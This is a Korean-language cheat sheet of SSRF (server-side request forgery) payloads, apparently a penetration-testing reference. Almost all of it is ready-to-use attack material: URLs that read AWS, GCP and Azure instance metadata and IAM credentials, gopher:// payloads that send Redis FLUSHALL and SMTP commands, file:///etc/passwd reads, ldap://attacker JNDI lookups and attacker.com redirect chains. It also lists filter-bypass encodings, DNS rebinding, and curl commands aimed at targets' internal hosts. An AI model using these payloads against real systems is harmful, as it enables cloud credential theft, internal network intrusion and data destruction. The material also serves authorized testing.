### 기본 페이로드

#### 로컬 서비스 (Direct)
- `http://127.0.0.1/` (URL parameter)
- `http://localhost/`
- `http://127.0.0.1:22/` (포트 스캔)
- `http://127.0.0.1:6379/` (Redis)
- `http://127.0.0.1:8080/admin`

#### Cloud Metadata (가장 흔한 실전 영향)

| 클라우드 | URL | 헤더 |
|---|---|---|
| AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/` | (없음) |
| AWS IAM credentials | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | (없음) |
| AWS IMDSv2 (토큰 후 metadata) | `http://169.254.169.254/latest/api/token` (PUT) → `X-aws-ec2-metadata-token` | `X-aws-ec2-metadata-token-ttl-seconds: 21600` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` | `Metadata-Flavor: Google` |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | `Metadata: true` |
| Alibaba | `http://100.100.100.200/latest/meta-data/` | (없음) |
| Oracle | `http://192.0.0.192/latest/` | (없음) |
| Kubernetes | `http://kubernetes.default.svc/api/v1/namespaces/` | (token in pod) |
| Docker | `http://169.254.169.254/latest/meta-data/` (ECS), `http://172.17.0.1/v1.40/info` |

#### 내부 네트워크
- `http://10.0.0.1/`, `http://192.168.0.1/`, `http://172.16.0.1/`
- `http://172.16.0.0/12`, `http://10.0.0.0/8`, `http://192.168.0.0/16`

#### OOB Blind
- `https://CALLBACK.oast.fun/ssrf` — interactsh/Burp Collaborator 등
- `http://CALLBACK.burpcollaborator.net/`
- DNS only: `http://CALLBACK.oast.fun/` (DNS 쿼리만 발생해도 확인됨)

#### 프로토콜별 페이로드

| 스킴 | 활용 |
|---|---|
| `http://`, `https://` | 일반 |
| `gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a` | Redis 직접 명령 (TCP raw) |
| `gopher://127.0.0.1:25/_HELO%20...` | SMTP 메일 발송 |
| `dict://127.0.0.1:6379/INFO` | 포트 스캔, Redis 명령 |
| `file:///etc/passwd` | 로컬 파일 (curl/PHP `file_get_contents`) |
| `ldap://attacker/Exploit` | JNDI lookup (Java RCE — log4shell 변형) |
| `ftp://attacker/x` | 내부 FTP 서버 |
| `jar://https://attacker/x.zip!/file` | Java JAR 로드 |
| `netdoc://`, `mailto://` | 일부 프로토콜 |

#### Redirect chain (first-hop만 검증 우회)
```
# 공격자 서버 https://attacker.com/redir → 302 Location: http://169.254.169.254/
curl "https://target/api/fetch?url=https://attacker.com/redir"
```

#### 파일 다운로드 sink
```
# 사용자 URL을 server-side fetch
curl "https://target/api/import?url=http://127.0.0.1:8080/internal"
curl "https://target/api/avatar?url=http://169.254.169.254/latest/meta-data/"
```

---

### 우회 페이로드

| 방어 | 페이로드 |
|---|---|
| `127.0.0.1` 단일 차단 | `0.0.0.0`, `localhost`, `127.1`, `127.0.0.0/8`, `127.127.127.127`, octal `0177.0.0.1`, decimal `2130706433`, hex `0x7f000001`, mixed `127.0.0.1.nip.io`, `127.0.0.1.xip.io` |
| IPv4만 차단 | `[::1]`, `[::ffff:127.0.0.1]`, `[::ffff:7f00:1]`, `[0:0:0:0:0:ffff:127.0.0.1]`, `[fd00::1]` |
| 도메인 화이트리스트 substring | `https://allowed.com.attacker.com`, `https://allowed.com@attacker.com`, `https://attacker.com#allowed.com`, `https://attacker.com?x=allowed.com` |
| URL parser 차이 (parser confusion) | `http://evil.com\@127.0.0.1/`, `http://127.0.0.1#@evil.com/`, `http://evil.com:80@127.0.0.1/`, `http://[email protected]:[email protected]/` |
| Redirect first-hop만 검증 | 외부 200 → 302로 내부 IP 리다이렉트 (`followRedirects: true` 설정 시) |
| DNS rebinding | TTL 0 도메인 (1차 외부 IP, 2차 내부 IP) — `nip.io`/`xip.io`/`rebinder.online`/자체 DNS |
| Cloud metadata IP 차단 (`169.254.169.254`) | AWS alias `instance-data`, IPv6 `[fd00:ec2::254]`, decimal `2852039166`, octal `0250.0376.0251.0376` |
| `http`/`https` 외 스킴 차단 | `gopher://`, `file://`, `dict://`, `ldap://`, `ftp://`, `jar://`, `netdoc://` |
| egress proxy + URL 검증 | proxy가 검증 정확도 낮은 경우 — `Host` 헤더 변조로 다른 백엔드 라우팅 |
| URL parsing 차이 (WHATWG vs urlparse vs java.net.URL) | 같은 URL을 서버 검증과 fetch가 다르게 파싱 — host 추출 결과 다름 |
| Punycode 차단 | 동형 문자 (`сloudflare.com` cyrillic с) — IDN 정규화 |
| HTTP→HTTPS 강제 | `https://allowed.com@127.0.0.1/` (HTTPS 검증 통과 후 host는 127.0.0.1) |

#### OOB 측정 (Blind 우선)
```
# 1. interactsh (대표 OAST)
interactsh-client -v
# CALLBACK.oast.fun URL 받아서 페이로드 삽입
curl "https://target/api/webhook?url=https://CALLBACK.oast.fun/ssrf"

# 2. Burp Collaborator (Burp Suite Pro)
# 3. webhook.site (간이)

# 4. 시간 차이로 추정 (열린 포트 vs 닫힌 포트)
curl -w "%{time_total}\n" -o /dev/null "https://target/api/fetch?url=http://127.0.0.1:22"
curl -w "%{time_total}\n" -o /dev/null "https://target/api/fetch?url=http://127.0.0.1:1"
```

#### Header 변형 (Host 헤더 SSRF)
```
# Host 헤더로 SSRF 변형 (request smuggling/cache poisoning 결합)
curl "https://target/api/x" -H "Host: 127.0.0.1"
curl "https://target/api/x" -H "Host: 169.254.169.254"
```

---

### 참고사항

- 클라우드 metadata 접근이 SSRF의 가장 큰 실전 영향 (IAM credential → 계정 takeover)
- AWS IMDSv2 강제 환경(토큰 요구)에서는 단순 GET 차단 — 영향도 감소 (PUT으로 토큰 받기 시도)
- 빈출 sink: Webhook 발송, PDF 생성(puppeteer/wkhtmltopdf), 이미지 처리(sharp/Pillow), 프로필 사진 URL fetch, OAuth callback fetch
- `Host: 127.0.0.1` 헤더로 SSRF 변형 가능 (request smuggling/cache poisoning 결합)
- XXE → SSRF 체인 (`<!ENTITY x SYSTEM "http://internal/">`) — xxe-scanner 결합
- DNS rebinding은 인프라 필요 (TTL 0 + dual-record 도메인) — `rebinder.online` 같은 서비스 활용
- gopher://는 SMTP/Redis/Memcached로 임의 명령 실행 가능 (CRLF 인젝션 결합)
- Presigned URL 생성은 SSRF 아님 (서버가 fetch 안 함) — 혼동 주의
- Kubernetes pod 내부에선 `kubernetes.default.svc`로 API 접근 — service account token 노출
- ECS/EKS 환경에서 ECS task metadata는 `http://169.254.170.2/v2/credentials/` (다른 IP)
- IPv6 cloud metadata 변형 (`[fd00:ec2::254]`) 점차 확산
- WHATWG URL 표준과 Python `urlparse`/Java `URL`의 파싱 차이가 핵심 우회 게이트
- `nip.io`, `xip.io`, `sslip.io`는 IP를 도메인으로 변환 — `127.0.0.1.nip.io` → 127.0.0.1 resolve
- DNS 콜백만 받아도 SSRF 확정 (HTTP 응답 받지 못해도) — 가장 신뢰성 높은 Blind 검증
